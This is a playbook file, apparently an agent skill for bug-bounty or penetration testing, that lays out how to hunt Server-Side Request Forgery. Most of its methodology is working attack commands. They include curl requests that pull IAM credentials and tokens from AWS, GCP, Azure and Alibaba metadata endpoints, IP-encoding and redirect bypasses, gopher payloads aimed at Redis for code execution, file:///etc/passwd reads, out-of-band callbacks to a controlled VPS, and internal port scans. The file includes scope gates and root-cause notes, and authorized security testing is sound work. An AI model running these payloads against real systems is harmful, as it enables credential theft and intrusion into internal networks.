---
name: hunt-ssrf
description: >
  Hunt for Server-Side Request Forgery: basic (response reflected), blind (out-of-band only),
  and cloud metadata access (AWS/GCP/Azure IMDS). Use when the app fetches a URL on the server
  side — webhooks, "import from URL", PDF/image generators, URL preview/unfurl, SSO/SAML
  metadata fetch, PDF-to-HTML converters, avatar-from-URL, server-side rendering fetchers.
  Keywords: ssrf, server-side request forgery, metadata service, 169.254.169.254, OOB,
  Burp Collaborator, webhook abuse, DNS rebinding, internal network pivot, cloud IMDS.
  Do NOT use for client-triggered redirects a victim's browser follows — use hunt-open-redirect.
metadata:
  type: hunt
  phase: hunting
  cwe: [CWE-918]
  mitre_attack: [T1190, T1552.005]
  tools: [curl, ffuf, interactsh, nuclei, gopherus, ssrfmap]
depends_on: [active-recon, web-crawling, param-discovery]
feeds_into: [chain-analysis, internal-pivot, cloud-cred-theft]
chains_with: [info-disclosure, rce, auth-bypass]
---

## Signals

- Any feature that takes a URL as input and the server fetches it: webhooks, "import avatar from
  URL", link preview/unfurl, PDF generation from a URL, XML parsers resolving external entities
  (overlaps with hunt-xxe), server-side screenshot services, SSO metadata URL config.
- Parameters named `url`, `uri`, `path`, `dest`, `redirect`, `image`, `src`, `callback`,
  `webhook`, `feed`, `endpoint`.
- API integrations that proxy requests server-side (e.g., "fetch this image and resize it").
- App running in a known cloud environment (check response headers, error messages, `Server:`
  banners) — makes IMDS a high-value target.
- File format converters that support remote resource fetch (Markdown-to-PDF with image URLs,
  DOCX/XLSX with external refs, SVG with `<image>` href).

## Prerequisites

- An identified URL-consuming parameter or feature.
- An OOB listener you control (Interactsh, Burp Collaborator, or your own VPS with a logging
  HTTP server + DNS) for blind confirmation.
- Knowledge of the target's likely cloud provider (AWS/GCP/Azure/Alibaba) to pick the right
  metadata endpoint — guess from headers, DNS, ASN, or just try all of them (they're on
  different IPs/paths so false positives are near-zero).

## Methodology

1. **Baseline — does the server actually fetch?** Point the param at your own listener and watch
   for an inbound hit:
   ```bash
   # own box running: python3 -m http.server 8000 (with access logging) or use interactsh
   curl -s -X POST https://target/api/webhook -d '{"url":"http://YOUR_VPS_IP:8000/ssrf-test"}' \
     -H "Content-Type: application/json"
   # or with interactsh-client running:
   curl -s "https://target/import?url=http://$(interactsh-client -v | grep -o '[a-z0-9]*\.oast\.fun')"
   ```
   A hit on your listener = confirmed basic SSRF (even blind), before touching anything internal.

2. **Response-reflected (non-blind) check** — some apps return fetched content directly:
   ```bash
   curl -s "https://target/proxy?url=http://169.254.169.254/latest/meta-data/" 
   curl -s "https://target/fetch?url=http://localhost:80/"
   curl -s "https://target/fetch?url=http://127.0.0.1:8080/actuator/env"
   ```
   If the response body contains metadata/internal content, it's non-blind — straightforward
   proof.

3. **Cloud metadata extraction** once SSRF reaches internal addressing (try the right one for
   the environment; each is unambiguous on hit):
   ```bash
   # AWS IMDSv1 (unauthenticated — older/misconfigured instances)
   curl -s "https://target/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
   curl -s "https://target/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"

   # AWS IMDSv2 requires a token — SSRF usually can't set custom headers, note this as a
   # mitigating factor if only GET-URL SSRF (no header control) is achievable:
   # TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

   # GCP
   curl -s "https://target/proxy?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
     # needs header Metadata-Flavor: Google — test if SSRF primitive allows header injection

   # Azure
   curl -s "https://target/proxy?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
     # needs header Metadata: true

   # Alibaba Cloud
   curl -s "https://target/proxy?url=http://100.100.100.200/latest/meta-data/"
   ```

4. **Blacklist/filter bypass** when the app blocks obvious internal IPs:
   ```bash
   # decimal/octal/hex IP encoding
   http://2130706433/           # decimal for 127.0.0.1
   http://0177.0.0.1/           # octal
   http://0x7f.0.0.1/           # hex
   http://127.1/                # short form
   http://[::ffff:127.0.0.1]/   # IPv6-mapped
   http://localtest.me/         # resolves to 127.0.0.1 publicly
   http://169.254.169.254.nip.io/   # wildcard DNS to attacker-chosen IP string
   # DNS rebinding — resolve to allowed IP on first check, internal IP on fetch (needs rebinding
   # service like rebinder, time-of-check/time-of-use gap in the app's validator)
   # redirect-based bypass — host a 302 redirect to the internal target on infra you control:
   curl -s "https://target/proxy?url=http://YOUR_VPS/redir" # redir 302s to http://169.254.169.254/...
   ```

5. **Protocol smuggling via gopher/file/dict** for SSRF reaching internal services beyond HTTP
   (Redis, Memcached, internal APIs) when the fetcher supports arbitrary schemes:
   ```bash
   gopherus --exploit redis
   # produces a gopher:// payload string, feed into the vulnerable param:
   curl -s "https://target/proxy?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%2A%2A..."
   curl -s "https://target/proxy?url=file:///etc/passwd"   # if file:// scheme allowed
   ```

6. **Automated/template sweep:**
   ```bash
   nuclei -l urls.txt -tags ssrf -o nuclei_ssrf.txt
   python3 ssrfmap.py -r request.txt -p url -m all
   ```

7. **Confirm impact, not just connectivity.** A hit on your listener proves network reachability.
   To escalate to a finding with real impact, show: metadata/credential retrieval, internal
   service response content, or port-scan-via-timing of internal network (timing diff between
   open/closed internal ports through the SSRF primitive).

## Tooling

- `interactsh-client` / Burp Collaborator — blind OOB detection (HTTP + DNS).
- `gopherus` — gopher-protocol payload generation for internal service exploitation (Redis,
  MySQL, SSRF-to-RCE chains).
- `SSRFmap` — automated exploitation against known modules (Redis, MySQL, FastCGI, Docker).
- `nuclei -tags ssrf` — template triage.
- `ffuf` — fuzz internal IP ranges/ports through a confirmed SSRF primitive to map internal
  network (`ffuf -w ports.txt -u "https://target/proxy?url=http://10.0.0.5:FUZZ"`).

## Root Causes

- Server-side URL fetchers with no allowlist of destination hosts/schemes.
- Blacklist-based validation (deny `169.254.169.254`, `localhost`, `127.0.0.1` as literal strings)
  instead of resolving and checking the actual destination IP, defeated by encoding/redirects/DNS
  rebinding.
- Fetchers that follow redirects by default without re-validating the final destination.
- Cloud instances still exposing IMDSv1 without requiring IMDSv2 session tokens.
- Overly permissive protocol support (`file://`, `gopher://`, `dict://`) in the underlying HTTP
  client library.

## Validation Gate (minimum proof)

- **Basic/non-blind:** response body contains content only retrievable via server-side fetch of
  an internal or attacker-controlled resource (your listener's unique marker, or genuine internal
  service banner).
- **Blind:** a verified inbound connection on your OOB listener correlated by a unique token to
  the specific request/time you sent — not a general background scan hit.
- **Cloud metadata:** actual credential/token material or instance metadata retrieved and
  displayed back through the app (not just a "connection succeeded" timing signal).
- Document the exact internal destination reached and how (direct, encoded bypass, redirect,
  rebinding) — this determines CVSS (network: adjacent vs. amplified impact).

## Gotchas

- **Minimum proof, not lateral movement.** Confirming metadata credential retrieval is the
  finding. Do not proceed to use stolen cloud credentials against the cloud API without an
  explicit operator gate — that's a new scope boundary (cloud account, not just the web app).
- **Common N/A:** app fetches URL but only for images and re-encodes them server-side
  (strips response, returns a re-rendered image) — still can be a blind SSRF for port-scanning/
  IMDSv1 timing, but not response-reflected; be precise about which variant you're proving.
- **Common N/A:** IMDSv2 enforced + SSRF primitive is a pure GET-URL fetch with no header
  control → metadata token request (PUT + custom header) is not achievable; downgrade severity
  and note explicitly, don't claim full IMDS compromise.
- **Overclaim trap:** a DNS lookup success (resolver reached your nameserver) is weaker proof
  than an actual HTTP request hit — some validators only resolve DNS to check against a
  blocklist without ever issuing the real fetch; confirm the HTTP layer too.
- **Overclaim trap:** reaching `169.254.169.254` through a CDN/proxy that itself sits on that
  address space in some cloud setups can be a false positive — verify the IMDS response shape
  matches the real cloud provider's schema, not a generic 200.
- DNS rebinding attacks need a very narrow TOCTOU window and dedicated infra (rebinder service)
  — don't claim rebinding works from a blocklist bypass alone; demonstrate the actual rebind.

## Chain Anchors

Before declaring this finding complete, probe these escalation paths:

1. **Cloud metadata endpoint** — Test 169.254.169.254 (AWS IMDSv1/v2), Azure IMDS, and GCP metadata for credential leakage.
2. **Internal service access** — Probe localhost:8080/:6379 (Redis)/:9200 (Elasticsearch)/:27017 (MongoDB) for unauthenticated internal services.
3. **file:// protocol read** — Can the SSRF primitive be redirected to file:// to read local files?
4. **DNS rebinding bypass** — Does the allowlist check happen at resolve-time rather than connect-time? Test DNS rebinding to bypass hostname allowlists.
5. **Internal admin pivot** — Can you reach internal admin panels or management interfaces not exposed externally?

A finding without chain anchor results is INCOMPLETE. Record each anchor as
tested/not-applicable/blocked with the reason.

## Chains & Compositions

- SSRF → cloud metadata credential theft → cloud API access (new scope — stop and escalate per
  Gates humanos before using the credentials).
- SSRF → internal network **info-disclosure** (reach admin panels, internal APIs not exposed
  externally).
- SSRF + Redis/Gopher → **rce** (SSRF-to-RCE via Redis `CONFIG SET`/`MODULE LOAD` or Memcached
  injection).
- SSRF reaching internal auth endpoints → **auth-bypass** (internal-only admin routes often skip
  authentication, trusting network position).
- SSRF via XXE external entity fetch — see **hunt-xxe** for the XML-specific delivery vector.
